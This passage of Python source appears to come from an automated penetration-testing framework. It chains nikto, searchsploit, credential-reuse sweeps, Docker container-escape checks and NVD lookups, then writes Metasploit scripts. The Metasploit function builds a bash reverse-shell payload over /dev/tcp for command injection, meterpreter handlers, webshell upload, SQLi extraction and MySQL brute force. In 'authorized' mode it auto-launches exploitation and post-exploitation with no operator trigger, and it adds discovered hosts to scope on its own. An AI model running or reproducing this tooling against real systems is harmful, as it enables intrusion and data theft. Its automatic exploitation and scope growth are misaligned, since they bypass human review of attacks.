    if (scheme == "http" and port == 80) or (scheme == "https" and port == 443):
        url = f"{scheme}://{host}"
    else:
        url = f"{scheme}://{host}:{port}"
    try:
        from skg_services.gravity.web_runtime import collect_nikto_events_to_file

        events_file = out_dir / f"gravity_nikto_{ip.replace('.','_')}_{run_id}.ndjson"
        # Derive attack_path_id from current unknown wickets rather than hardcoding.
        # Priority: SQLi chain > CVE chain > info disclosure > general surface.
        _ws = (target.get("wicket_states") or {}) if isinstance(target, dict) else {}
        _unknown = {w for w, s in _ws.items() if s == "unknown"}
        if _unknown & {"WB-41", "WB-09", "WB-10"}:
            _apt = "web_sqli_to_shell_v1"
        elif _unknown & {"WB-03", "WB-04", "WB-11"}:
            _apt = "web_cve_exploitation_v1"
        elif _unknown & {"WB-07", "WB-17", "WB-08"}:
            _apt = "web_info_disclosure_v1"
        else:
            _apt = "web_surface_v1"

        from skg.identity.workload import canonical_workload_id as _cwid
        events = collect_nikto_events_to_file(
            url,
            out_path=events_file,
            out_dir=out_dir,
            attack_path_id=_apt,
            run_id=run_id,
            workload_id=_cwid(host, domain="web"),
        )

        result["events_file"] = str(events_file)
        result["unknowns_resolved"] = len(
            [e for e in events if e.get("payload", {}).get("status") == "realized"]
        )
        result["success"] = True
        if events:
            _ingest_events_to_kernel(events, ip)
    except Exception as exc:
        log.warning(f"[nikto] {ip}: {exc}")
        result["error"] = str(exc)
    return result


def _exec_searchsploit(ip: str, target: dict, run_id: str, out_dir: Path, result: dict) -> dict:
    """Execute searchsploit exploit-db search for detected service versions."""
    services = target.get("target", {}).get("services", []) or []
    banners = [{"service": s.get("service",""), "banner": s.get("banner",""),
                "port": s.get("port",0), "target_ip": ip}
               for s in services if s.get("banner")]
    if not banners:
        return result
    try:
        from skg_services.gravity.host_runtime import collect_searchsploit_events_to_file
        _ss_out = out_dir / f"searchsploit_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
        events = collect_searchsploit_events_to_file(banners, out_path=_ss_out)
        result["unknowns_resolved"] = len([e for e in events
            if e.get("payload",{}).get("status") == "realized"])
        if events:
            _ingest_events_to_kernel(events, ip)
    except Exception as exc:
        log.warning(f"[searchsploit] {ip}: {exc}")
    return result


def _scope_expand_from_nmap(events_file: str, surface_path=None) -> list[str]:
    """
    Parse nmap NDJSON events for newly discovered IPs and register them
    in the surface. Returns list of newly added IPs.
    """
    if not events_file or not Path(events_file).exists():
        return []
    new_ips = []
    try:
        events = [json.loads(l) for l in Path(events_file).read_text().splitlines() if l.strip()]
        for ev in events:
            payload = ev.get("payload", {})
            # Look for network discovery events that mention other IPs
            hosts = payload.get("discovered_hosts", [])
            for h in hosts:
                ip = h.get("ip") if isinstance(h, dict) else str(h)
                if ip and re.match(r"^\d+\.\d+\.\d+\.\d+$", ip):
                    try:
                        from skg.cli.utils import _register_target
                        _register_target(ip, domain=None)
                        new_ips.append(ip)
                        print(f"  [SCOPE] Auto-added discovered host: {ip}")
                    except Exception:
                        pass
    except Exception:
        pass
    return new_ips


def _exec_cred_reuse(ip, target, run_id, out_dir, result, authorized=False):
    """
    Credential reuse instrument.

    Tests all stored credentials against credential-accepting services on
    this target. Coupling energy drives gravity selection — when credentials
    exist that haven't been tried here, this instrument has high potential.

    authorized=True: runs tests directly.
    authorized=False: generates operator-gated proposals.
    """
    try:
        import sys as _sys
        _sys.path.insert(0, str(Path(__file__).parent))
        from cred_reuse import CredentialStore, run_reuse_sweep, reuse_energy

        store = CredentialStore()
        E_before = reuse_energy(ip, target, store)

        events = run_reuse_sweep(
            target_ip=ip,
            surface=target,
            events_dir=EVENTS_DIR,
            out_dir=out_dir,
            store=store,
            authorized=authorized,
        )

        E_after = reuse_energy(ip, target, store)
        result["success"] = True
        result["cred_events"] = len(events)
        result["cred_energy_before"] = E_before
        result["cred_energy_after"] = E_after
        result["cred_energy_reduced"] = round(E_before - E_after, 2)

    except Exception as exc:
        result["success"] = False
        result["error"] = f"cred_reuse: {exc}"
        log.warning(f"[cred_reuse] instrument error: {exc}")

    return result


def _exec_container_inspect(ip, target, run_id, out_dir, result):
    """Run docker inspect from the host against a container at ip.
    Emits CE-01..CE-07 wickets without needing SSH into the container.
    """
    import sys as _sys
    _sys.path.insert(0, "/opt/skg/skg-container-escape-toolchain/adapters/container_inspect")
    try:
        from parse import (
            check_running_as_root,
            check_privileged,
            check_docker_socket,
            check_host_network,
            check_sensitive_mounts,
            check_cap_sys_admin,
        )
    except ImportError as e:
        result["error"] = f"container_inspect adapter not found: {e}"
        return result

    # Find container ID for this IP via docker inspect
    try:
        r = subprocess.run(
            ["docker","ps","-q"],
            capture_output=True, text=True, timeout=5
        )
        container_ids = r.stdout.strip().split()
    except Exception as e:
        result["error"] = f"docker ps failed: {e}"
        return result

    matched_inspect = None
    for cid in container_ids:
        try:
            r2 = subprocess.run(
                ["docker","inspect","--format",
                 "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cid],
                capture_output=True, text=True, timeout=5
            )
            if ip in r2.stdout:
                r3 = subprocess.run(["docker","inspect",cid],
                                    capture_output=True, text=True, timeout=5)
                import json as _json
                data = _json.loads(r3.stdout)
                matched_inspect = data[0] if data else None
                break
        except Exception:
            continue

    if not matched_inspect:
        result["error"] = f"No docker container found at {ip}"
        return result

    events_file = out_dir / f"gravity_ce_{ip.replace('.','_')}_{run_id[:8]}.ndjson"
    workload_id = f"container_escape::{ip}"
    attack_path_id = "container_escape_privileged_v1"

    caps = matched_inspect.get("HostConfig",{}).get("CapAdd") or []
    cap_drop = matched_inspect.get("HostConfig",{}).get("CapDrop") or []

    emit_fn_args = (matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)

    try:
        check_running_as_root(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_privileged(matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)
        check_docker_socket(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_host_network(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_sensitive_mounts(matched_inspect, events_file, attack_path_id, run_id, workload_id)
        check_cap_sys_admin(matched_inspect, caps, events_file, attack_path_id, run_id, workload_id)
    except Exception as e:
        result["error"] = f"container_inspect failed: {e}"
        return result

    # Count events written
    try:
        n = sum(1 for l in events_file.read_text().splitlines() if l.strip())
    except Exception:
        n = 0

    # Mirror to EVENTS_DIR
    if events_file.exists():
        EVENTS_DIR.mkdir(parents=True, exist_ok=True)
        (EVENTS_DIR / events_file.name).write_text(events_file.read_text())

    # Run CE projection
    try:
        ce_proj = SKG_HOME / "skg-container-escape-toolchain" / "projections" / "escape" / "run.py"
        interp_file = INTERP_DIR / f"ce_{ip.replace('.','_')}_{run_id[:8]}.json"
        INTERP_DIR.mkdir(parents=True, exist_ok=True)
        if ce_proj.exists():
            subprocess.run(
                [sys.executable, str(ce_proj),
                 "--in", str(events_file),
                 "--out", str(interp_file),
                 "--attack-path-id", attack_path_id],
                capture_output=True, timeout=30,
                cwd=str(SKG_HOME / "skg-container-escape-toolchain" / "projections")
            )
    except Exception:
        pass

    result["success"] = True
    result["events"] = n
    print(f"    [CE] {ip}: {n} container wicket events")

    # Defer follow-on proposal generation to the main gravity thread so it is
    # visible to the operator and interactive review happens on the foreground TTY.
    try:
        states = load_wicket_states(ip)
        realized = {
            w for w, s in states.items()
            if isinstance(s, dict) and s.get("status") == "realized"
        }
        follow_on = []
        if {"CE-01", "CE-02"}.issubset(realized):
            follow_on.append({"path_id": "container_escape_privileged_v1", "port": 22, "kwargs": {}})
        if {"CE-01", "CE-03", "CE-14"}.issubset(realized):
            follow_on.append({"path_id": "container_escape_socket_v1", "port": 22, "kwargs": {}})
        if follow_on:
            result["follow_on_paths"] = follow_on
    except Exception:
        pass
    return result


def _exec_nvd_feed(ip, target, run_id, out_dir, result):
    """Run NVD CVE lookup for discovered services."""
    api_key = _load_nvd_key()
    if not api_key:
        result["error"] = "No NVD API key"
        return result

    services_to_check = _nvd_service_candidates(ip, target)

    if not services_to_check:
        result["error"] = "No service versions discovered"
        return result

    try:
        sys.path.insert(0, str(FEEDS_PATH))
        from nvd_ingester import ingest_service
        CVE_DIR.mkdir(parents=True, exist_ok=True)
        events_file = CVE_DIR / f"cve_events_{ip}_{run_id[:8]}.ndjson"

        total_candidates = 0
        for svc in services_to_check:
            candidates = ingest_service(svc, ip, events_file, api_key, run_id)
            total_candidates += len(candidates)

        result["success"] = True
        result["services_checked"] = len(services_to_check)
        result["service_inputs"] = services_to_check[:12]
        result["cve_candidates"] = total_candidates
    except Exception as e:
        result["error"] = str(e)

    return result


def _nvd_service_candidates(ip, target):
    """
    Build NVD lookup inputs from the canonical target/service inventory first,
    then fall back to narrower web-version disclosure detail.
    """

    def _add(acc, value):
        if value is None:
            return
        text = str(value).strip()
        if not text:
            return
        if text not in acc:
            acc.append(text)

    services_to_check = []

    for svc in list((target or {}).get("services") or []):
        banner = svc.get("banner")
        product = svc.get("product")
        version = svc.get("version")
        service = svc.get("service")
        extrainfo = svc.get("extrainfo")

        if banner:
            _add(services_to_check, banner)

        if product and version:
            _add(services_to_check, f"{product}/{version}")
        elif service and version:
            _add(services_to_check, f"{service}/{version}")

        if product and extrainfo:
            _add(services_to_check, f"{product} {extrainfo}")
        elif service and extrainfo:
            _add(services_to_check, f"{service} {extrainfo}")

    # Supplemental web disclosure detail for version strings not present in the
    # canonical service inventory yet.
    try:
        states = load_wicket_states(ip)
        wb02 = states.get("WB-02", {})
        detail = wb02.get("detail", "")
        try:
            headers = json.loads(detail)
            for val in headers.values():
                _add(services_to_check, val)
        except (json.JSONDecodeError, TypeError):
            _add(services_to_check, detail)
    except Exception:
        pass

    return services_to_check


def _exec_metasploit(ip, target, run_id, out_dir, result, states=None, authorized=False):
    """
    Use Metasploit for targeted observation or exploitation.
    Generates an RC script based on current confirmed wicket states:
      - WB-14 (CMDI) realized → exploit/multi/handler with reverse shell
      - WB-09 (SQLi injectable) realized → sqlmap-style extraction module
      - WB-21 (webshell upload) realized → exploit/multi/handler
      - default → auxiliary scanner (enumeration, not exploitation)
    Deduplicates: only one pending proposal per ip:port allowed.
    """
    import re as _re

    all_services = target.get("services", []) or []

    # Categorise discovered services — MSF runs against whatever is open
    web_ports  = [s["port"] for s in all_services
                  if s.get("service","") in ("http","https","http-alt","https-alt")
                  or str(s.get("port","")) in ("80","443","8080","8443","8008","8009")]
    smb_ports  = [s["port"] for s in all_services
                  if str(s.get("port","")) in ("139","445")
                  or any(x in (s.get("service","") or "").lower()
                         for x in ("smb","netbios","microsoft-ds","cifs"))]
    ssh_ports  = [s["port"] for s in all_services
                  if str(s.get("port","")) == "22"
                  or "ssh" in (s.get("service","") or "").lower()]
    rdp_ports  = [s["port"] for s in all_services
                  if str(s.get("port","")) == "3389"
                  or any(x in (s.get("service","") or "").lower()
                         for x in ("rdp","ms-wbt","msrdp"))]
    ftp_ports  = [s["port"] for s in all_services
                  if str(s.get("port","")) == "21"
                  or "ftp" in (s.get("service","") or "").lower()]
    db_services = [(s["port"], (s.get("service","") or "").lower()) for s in all_services
                   if str(s.get("port","")) in ("3306","5432","5433","1433","1521","27017","6379")
                   or any(x in (s.get("service","") or "").lower()
                          for x in ("mysql","postgres","mssql","oracle","mongodb","redis"))]
    winrm_ports = [s["port"] for s in all_services
                   if str(s.get("port","")) in ("5985","5986")]

    # Primary port for proposal key (used in dedup and description)
    # Prefer web if available; fall back to any open port
    port = (web_ports[0] if web_ports else
            smb_ports[0] if smb_ports else
            ssh_ports[0] if ssh_ports else
            rdp_ports[0] if rdp_ports else
            ftp_ports[0] if ftp_ports else
            all_services[0]["port"] if all_services else 80)

    # ── Dedup: skip if a pending proposal already exists for this ip:port ────
    proposals_dir = SKG_STATE_DIR / "proposals"
    if proposals_dir.exists():
        _now_ts = datetime.now(timezone.utc)
        existing_pending = []
        for _f in proposals_dir.glob("*.json"):
            try:
                _p = json.loads(_f.read_text()) if _f.stat().st_size < 50000 else {}
            except Exception:
                continue
            if not (_p.get("status") == "pending" and
                    str(port) in _p.get("description","") and
                    ip in _p.get("description","")):
                continue
            # Expire pending proposals older than 4 hours — they're stale
            try:
                _age = _now_ts - datetime.fromisoformat(_p.get("generated_at","1970-01-01T00:00:00+00:00"))
                if _age.total_seconds() > 14400:
                    _p["status"] = "expired"
                    _f.write_text(json.dumps(_p, indent=2))
                    continue
            except Exception:
                pass
            existing_pending.append(_f)
        if existing_pending:
            print(f"    [MSF] Pending proposal already exists for {ip}:{port} — skipping duplicate")
            result["error"] = f"Pending proposal already exists for {ip}:{port} — skipping duplicate"
            result["success"] = False
            return result

    # ── Determine what wickets are confirmed ──────────────────────────────────
    st = states or {}
    def is_realized(wid):
        s = st.get(wid, {})
        return s.get("status") == "realized" if isinstance(s, dict) else str(s) == "realized"

    cmdi_confirmed  = is_realized("WB-43")          # cmdi_injectable
    sqli_confirmed  = is_realized("WB-41")          # sqli_injectable
    upload_confirmed= is_realized("WB-21") or is_realized("WB-13")  # webshell_present / cve_version_match
    auth_confirmed  = is_realized("WB-05") or is_realized("WB-10")  # admin_interface_exposed / default_credentials

    # LHOST = attacker box IP for reverse shell payloads (auto-detected)
    try:
        import socket as _sock
        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
        _s.connect(("8.8.8.8", 80))
        LHOST = _s.getsockname()[0]
        _s.close()
    except Exception:
        LHOST = "127.0.0.1"
    LPORT = 4444

    # Extract discovered web paths from target state (set by gobuster/nikto events)
    _discovered_paths = []
    if isinstance(target, dict):
        for ev in (target.get("events") or []):
            _detail = ev.get("payload", {}).get("detail", "")
            import re as _re
            _discovered_paths += _re.findall(r"(/[^\s,]+)", _detail)

    def _best_path(candidates):
        """Return first discovered path matching any candidate hint, or empty string."""
        for hint in candidates:
            for p in _discovered_paths:
                if hint.lower() in p.lower():
                    return p
        return ""

    if cmdi_confirmed:
        # ── CMDI → reverse shell via command injection ─────────────────────
        # Use discovered exec/cmd path if available; avoid hardcoded DVWA paths
        cmdi_path = _best_path(["exec", "cmd", "command", "rce", "ping"]) or "/<cmdi_path>"
        cmdi_url  = f"http://{ip}:{port}{cmdi_path}"
        payload   = f"; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"
        rc_lines = [
            f"# CMDI confirmed (WB-43) — exploit/multi/handler for {ip}:{port}",
            f"use exploit/multi/handler",
            f"set PAYLOAD linux/x64/meterpreter/reverse_tcp",
            f"set LHOST {LHOST}",
            f"set LPORT {LPORT}",
            f"set ExitOnSession false",
            f"run -z",
            f"",
            f"sleep 30",
            f"sessions -l",
            f"exit -y",
            f"",
            f"# Deliver payload via discovered endpoint:",
            f"# URL: {cmdi_url}",
            f"# Payload: {payload}",
        ]
        desc = f"exploit/multi/handler (CMDI WB-43 confirmed) against {ip}:{port}"
        confidence = 0.92
        module_candidates = [{"module":"exploit/multi/handler","confidence":0.92,"module_class":"exploit"}]

    elif upload_confirmed and auth_confirmed:
        # ── File upload + auth → webshell upload ──────────────────────────
        upload_path = _best_path(["upload", "file", "attach", "import"]) or "/<upload_path>"
        rc_lines = [
            f"# File upload confirmed (WB-13/21) + auth (WB-05/10) — webshell via upload for {ip}:{port}",
            f"use exploit/multi/handler",
            f"set PAYLOAD php/meterpreter/reverse_tcp",
            f"set LHOST {LHOST}",
            f"set LPORT {LPORT}",
            f"set ExitOnSession false",
            f"run -z",
            f"",
            f"sleep 30",
            f"sessions -l",
            f"exit -y",
            f"",
            f"# Upload webshell to discovered path: http://{ip}:{port}{upload_path}",
        ]
        desc = f"exploit/multi/handler (upload WB-13/21 confirmed) against {ip}:{port}"
        confidence = 0.85
        module_candidates = [{"module":"exploit/multi/handler","confidence":0.85,"module_class":"exploit"}]

    elif sqli_confirmed:
        # ── SQLi confirmed → data extraction ──────────────────────────────
        sqli_path = _best_path(["sqli", "sql", "search", "query", "id=", "user="]) or "/"
        rc_lines = [
            f"# SQLi confirmed (WB-41) — extraction for {ip}:{port}",
            f"use auxiliary/scanner/http/sql_injection",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"set TARGETURI {sqli_path}",
            f"run",
            f"",
            f"# Also try blind SQLi:",
            f"use auxiliary/scanner/http/blind_sql_query",
            f"set RHOSTS {ip}",
            f"set RPORT {port}",
            f"run",
        ]
        desc = f"SQLi extraction (WB-41 confirmed) against {ip}:{port}"
        confidence = 0.88
        module_candidates = [
            {"module":"auxiliary/scanner/http/sql_injection","confidence":0.88,"module_class":"auxiliary"},
            {"module":"auxiliary/scanner/http/blind_sql_query","confidence":0.75,"module_class":"auxiliary"},
        ]

    else:
        # ── Default: enumerate based on what's actually open ────────────────
        # Build a comprehensive auxiliary scan covering all detected services
        rc_lines = [
            f"# Metasploit auxiliary scan — gravity-directed enumeration",
            f"# Target: {ip}",
            f"setg RHOSTS {ip}",
            f"setg THREADS 4",
            f"",
        ]
        module_candidates = []

        # SMB — always check MS17-010 + enumeration when port 139/445 open
        for sp in smb_ports:
            rc_lines += [
                f"# ── SMB on port {sp} ──────────────────────────────────",
                f"use auxiliary/scanner/smb/smb_ms17_010",
                f"set RHOSTS {ip}", f"set RPORT {sp}", f"run", f"",
                f"use auxiliary/scanner/smb/smb_enumshares",
                f"set RHOSTS {ip}", f"set RPORT {sp}", f"run", f"",
                f"use auxiliary/scanner/smb/smb_version",
                f"set RHOSTS {ip}", f"set RPORT {sp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/smb/smb_ms17_010","confidence":0.85,"module_class":"auxiliary"},
                {"module":"auxiliary/scanner/smb/smb_enumshares","confidence":0.80,"module_class":"auxiliary"},
                {"module":"auxiliary/scanner/smb/smb_version","confidence":0.90,"module_class":"auxiliary"},
            ]

        # RDP
        for rp in rdp_ports:
            rc_lines += [
                f"# ── RDP on port {rp} ──────────────────────────────────",
                f"use auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce",
                f"set RHOSTS {ip}", f"set RPORT {rp}", f"set CheckOnly true", f"run", f"",
                f"use auxiliary/scanner/rdp/ms12_020_check",
                f"set RHOSTS {ip}", f"set RPORT {rp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/rdp/cve_2019_0708_bluekeep_rce","confidence":0.70,"module_class":"auxiliary"},
                {"module":"auxiliary/scanner/rdp/ms12_020_check","confidence":0.75,"module_class":"auxiliary"},
            ]

        # SSH
        for sp in ssh_ports:
            rc_lines += [
                f"# ── SSH on port {sp} ──────────────────────────────────",
                f"use auxiliary/scanner/ssh/ssh_version",
                f"set RHOSTS {ip}", f"set RPORT {sp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/ssh/ssh_version","confidence":0.85,"module_class":"auxiliary"},
            ]

        # FTP
        for fp in ftp_ports:
            rc_lines += [
                f"# ── FTP on port {fp} ──────────────────────────────────",
                f"use auxiliary/scanner/ftp/ftp_version",
                f"set RHOSTS {ip}", f"set RPORT {fp}", f"run", f"",
                f"use auxiliary/scanner/ftp/anonymous",
                f"set RHOSTS {ip}", f"set RPORT {fp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/ftp/ftp_version","confidence":0.85,"module_class":"auxiliary"},
                {"module":"auxiliary/scanner/ftp/anonymous","confidence":0.75,"module_class":"auxiliary"},
            ]

        # WinRM
        for wp in winrm_ports:
            rc_lines += [
                f"# ── WinRM on port {wp} ────────────────────────────────",
                f"use auxiliary/scanner/winrm/winrm_auth_methods",
                f"set RHOSTS {ip}", f"set RPORT {wp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/winrm/winrm_auth_methods","confidence":0.80,"module_class":"auxiliary"},
            ]

        # Databases
        for db_port, db_svc in db_services:
            if "mysql" in db_svc or str(db_port) == "3306":
                rc_lines += [
                    f"# ── MySQL on port {db_port} ───────────────────────",
                    f"use auxiliary/scanner/mysql/mysql_version",
                    f"set RHOSTS {ip}", f"set RPORT {db_port}", f"run", f"",
                    f"use auxiliary/scanner/mysql/mysql_login",
                    f"set RHOSTS {ip}", f"set RPORT {db_port}",
                    f"set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt",
                    f"set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt",
                    f"run", f"",
                ]
                module_candidates += [
                    {"module":"auxiliary/scanner/mysql/mysql_version","confidence":0.85,"module_class":"auxiliary"},
                ]
            elif "postgres" in db_svc or str(db_port) in ("5432","5433"):
                rc_lines += [
                    f"# ── PostgreSQL on port {db_port} ──────────────────",
                    f"use auxiliary/scanner/postgres/postgres_version",
                    f"set RHOSTS {ip}", f"set RPORT {db_port}", f"run", f"",
                    f"use auxiliary/scanner/postgres/postgres_login",
                    f"set RHOSTS {ip}", f"set RPORT {db_port}", f"run", f"",
                ]
                module_candidates += [
                    {"module":"auxiliary/scanner/postgres/postgres_login","confidence":0.80,"module_class":"auxiliary"},
                ]
            elif "mssql" in db_svc or str(db_port) == "1433":
                rc_lines += [
                    f"# ── MSSQL on port {db_port} ───────────────────────",
                    f"use auxiliary/scanner/mssql/mssql_ping",
                    f"set RHOSTS {ip}", f"run", f"",
                ]
                module_candidates += [
                    {"module":"auxiliary/scanner/mssql/mssql_ping","confidence":0.85,"module_class":"auxiliary"},
                ]

        # Web — always enumerate if ports found
        for wp in web_ports:
            rc_lines += [
                f"# ── HTTP on port {wp} ─────────────────────────────────",
                f"use auxiliary/scanner/http/http_version",
                f"set RHOSTS {ip}", f"set RPORT {wp}", f"run", f"",
                f"use auxiliary/scanner/http/dir_scanner",
                f"set RHOSTS {ip}", f"set RPORT {wp}", f"run", f"",
                f"use auxiliary/scanner/http/options",
                f"set RHOSTS {ip}", f"set RPORT {wp}", f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/http/http_version","confidence":0.80,"module_class":"auxiliary"},
                {"module":"auxiliary/scanner/http/dir_scanner","confidence":0.65,"module_class":"auxiliary"},
            ]

        # If nothing specific found, run generic port discovery
        if not (smb_ports or rdp_ports or ssh_ports or ftp_ports or web_ports or db_services):
            rc_lines += [
                f"use auxiliary/scanner/portscan/tcp",
                f"set RHOSTS {ip}",
                f"set PORTS 1-10000",
                f"set THREADS 50",
                f"run", f"",
            ]
            module_candidates += [
                {"module":"auxiliary/scanner/portscan/tcp","confidence":0.70,"module_class":"auxiliary"},
            ]

        rc_lines.append("exit")
        svc_summary = "+".join(filter(None, [
            f"smb({','.join(str(p) for p in smb_ports)})" if smb_ports else "",
            f"rdp({','.join(str(p) for p in rdp_ports)})" if rdp_ports else "",
            f"ssh({','.join(str(p) for p in ssh_ports)})" if ssh_ports else "",
            f"web({','.join(str(p) for p in web_ports)})" if web_ports else "",
            f"db({','.join(str(p) for p,_ in db_services)})" if db_services else "",
        ])) or "discovery"
        desc = f"Metasploit auxiliary sweep [{svc_summary}] against {ip}"
        confidence = 0.65

    # Determine domain from primary service
    _msf_domain = ("web" if web_ports else
                   "host" if (smb_ports or ssh_ports or rdp_ports) else
                   "data_pipeline" if db_services else "host")

    # Build realized list for proposal metadata
    realized_wids = [w for w in ["WB-06","WB-08","WB-09","WB-10","WB-13","WB-14","WB-21",
                                  "HO-19","HO-25","AD-01","DP-01"]
                     if is_realized(w)]

    proposal, artifact = create_msf_action_proposal(
        contract_name="msf_rc",
        rc_text="\n".join(rc_lines) + "\n",
        filename_hint=f"msf_{ip.replace('.','_')}_{run_id[:8]}.rc",
        out_dir=out_dir,
        domain=_msf_domain,
        description=desc,
        attack_surface=f"{ip}:{port}",
        hosts=[ip],
        category="runtime_observation" if not cmdi_confirmed else "exploitation",
        evidence=f"Realized: {realized_wids}" if realized_wids else f"Gravity selected MSF for {ip}:{port}",
        action={
            "instrument": "msf",
            "target_ip": ip,
            "port": port,
            "confidence": confidence,
            "realized_wickets": realized_wids,
            "lhost": LHOST,
            "lport": LPORT,
            "module_candidates": module_candidates,
        },
        notes=["Gravity-selected MSF runtime action RC."],
        metadata={"source": "skg-gravity.gravity_field._queue_msf", "cmdi_confirmed": bool(cmdi_confirmed)},
        command_prefix="msfconsole -q -r",
    )
    rc_file = Path(artifact["path"])

    mode = "EXPLOIT (CMDI)" if cmdi_confirmed else ("EXPLOIT (upload)" if upload_confirmed else ("SQLi extraction" if sqli_confirmed else "enumeration"))
    print(f"    [MSF] Mode: {mode}")
    print(f"    [MSF] RC: {artifact['path']}")
    print(f"    [MSF] Proposal: {proposal['id']}")
    print(f"    [MSF] Trigger: skg proposals trigger {proposal['id']}")
    review = interactive_review(proposal["id"])
    if review.get("decision") == "approved":
        print(f"    [MSF] Approved interactively: {proposal['id']}")
    elif review.get("decision") == "rejected":
        print(f"    [MSF] Rejected interactively: {proposal['id']}")
        result["success"] = True
        result["action"] = "reviewed"
        result["proposal_id"] = proposal["id"]
        result["suggestion"] = "rejected"
        return result
    elif review.get("decision") == "deferred":
        print(f"    [MSF] Deferred interactively: {proposal['id']}")
        result["success"] = True
        result["action"] = "reviewed"
        result["proposal_id"] = proposal["id"]
        result["suggestion"] = "deferred"
        return result

    # ── Auto-execute in authorized mode for exploit paths ─────────────────
    if authorized and cmdi_confirmed:
        # Authorized engagement + confirmed CMDI = fire immediately
        # No operator trigger needed — this is the exploitation phase.
        import subprocess as _sp
        msf_bin = _sp.run(["which","msfconsole"],capture_output=True)
        if msf_bin.returncode == 0:
            log_file = out_dir / f"msf_auto_{ip.replace('.','_')}_{run_id[:8]}.log"
            _log_fh = open(log_file, "w")
            proc = _sp.Popen(
                ["msfconsole","-q","-r",str(rc_file)],
                stdin=_sp.DEVNULL,
                stdout=_log_fh,
                stderr=_sp.STDOUT,
                start_new_session=True,
                close_fds=True,
            )
            _cmdi_hint = _best_path(["exec", "cmd", "command", "rce", "ping"]) or "/<cmdi_path>"
            print(f"    [MSF] AUTO-EXEC PID={proc.pid}")
            print(f"    [MSF] Listener log: {log_file}")
            print(f"    [MSF] Deliver payload via discovered endpoint:")
            print(f"          URL: http://{ip}:{port}{_cmdi_hint}")
            print(f"          Payload: ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'")
            print(f"    [MSF] Then await session: skg proposals trigger {proposal['id']} --await-session")
            # Update proposal to triggered
            _p = json.loads((SKG_STATE_DIR / "proposals" / f"{proposal['id']}.json").read_text())
            # (best-effort update)
            try:
                _pf = SKG_STATE_DIR / "proposals" / f"{proposal['id']}.json"
                _pd = json.loads(_pf.read_text())
                _pd["status"] = "triggered"
                _pd["pid"] = proc.pid
                _pf.write_text(json.dumps(_pd))
            except Exception:
                pass
            result["success"]     = True
            result["action"]      = "auto_executed"
            result["rc_file"]     = str(rc_file)
            result["proposal_id"] = proposal["id"]
            result["pid"]         = proc.pid

            # Poll for session via pymetasploit3 RPC — check every 3s up to 90s.
            # Subprocess msfconsole check would use a separate process with
            # an independent session space; RPC targets the same msfrpcd instance.
            import time as _time
            import os as _peos
            _session_found = False
            _found_sid = None
            _msf_pass_poll = _peos.environ.get("MSF_PASSWORD", "")
            if _msf_pass_poll:
                try:
                    from pymetasploit3.msfrpc import MsfRpcClient as _PollRpc
                    _poll_rpc = _PollRpc(
                        _msf_pass_poll,
                        server=_peos.environ.get("MSF_HOST", "127.0.0.1"),
                        port=int(_peos.environ.get("MSF_PORT", "55553")),
                        username=_peos.environ.get("MSF_USER", "msf"),
                        ssl=True,
                    )
                    print(f"    [MSF] Polling for session (3s interval, 90s timeout)...")
                    for _tick in range(30):
                        _slist = dict(_poll_rpc.sessions.list)
                        if _slist:
                            _found_sid = next(iter(_slist))
                            _session_found = True
                            print(f"    [MSF] Session {_found_sid} detected after {_tick*3}s")
                            break
                        _time.sleep(3)
                    if not _session_found:
                        print(f"    [MSF] No session after 90s — payload may have failed or been blocked")
                except Exception as _pe:
                    print(f"    [MSF] RPC poll unavailable ({_pe}) — operator must confirm session manually")
            else:
                print(f"    [MSF] MSF_PASSWORD not set — skipping session poll")

            if _session_found:
                print(f"    [POST-EXP] Attempting post-exploitation collection...")
                post_result = {"success": False}
                _exec_post_exploitation(ip, target, run_id, out_dir, post_result,
                                        session_id=_found_sid)
                if post_result.get("success"):
                    result["post_events"] = post_result.get("events", 0)
                    result["post_events_file"] = post_result.get("events_file","")
            return result

    elif authorized and not cmdi_confirmed:
        # ── Authorized + enumeration/SQLi mode = auto-run auxiliary modules ──
        # Auxiliary modules (scanners, version checks) are safe to run without
        # operator confirmation in an authorized engagement. Exploit modules
        # (multi/handler) still require the CMDI gate above.
        import subprocess as _sp
        msf_bin = _sp.run(["which", "msfconsole"], capture_output=True)
        if msf_bin.returncode == 0:
            log_file = out_dir / f"msf_enum_{ip.replace('.', '_')}_{run_id[:8]}.log"
            _log_fh = open(log_file, "w")
            proc = _sp.Popen(
                ["msfconsole", "-q", "-r", str(rc_file)],
                stdin=_sp.DEVNULL,
                stdout=_log_fh,
                stderr=_sp.STDOUT,
                start_new_session=True,
                close_fds=True,
            )
            print(f"    [MSF] ENUM AUTO-EXEC PID={proc.pid}")
            print(f"    [MSF] Log: {log_file}")
            result["success"]     = True
            result["action"]      = "auto_executed_enum"
            result["rc_file"]     = str(rc_file)
            result["proposal_id"] = proposal["id"]
            result["pid"]         = proc.pid
            return result

    result["success"]     = True
    result["action"]      = "operator"
    result["rc_file"]     = str(rc_file)
    result["proposal_id"] = proposal["id"]
    result["suggestion"]  = f"skg proposals trigger {proposal['id']}"
    return result


def _exec_pcap(ip, target, run_id, out_dir, result):
    """
    Capture traffic to/from the target and parse it into wicket events.

    Runs tshark synchronously (30s window) then uses net_sensor's
    _parse_tshark_fields / _flows_to_events to emit obs.attack.precondition
    events into DISCOVERY_DIR.  The next load_wicket_states() call picks
    them up so the entropy calculation reflects what was seen on the wire:
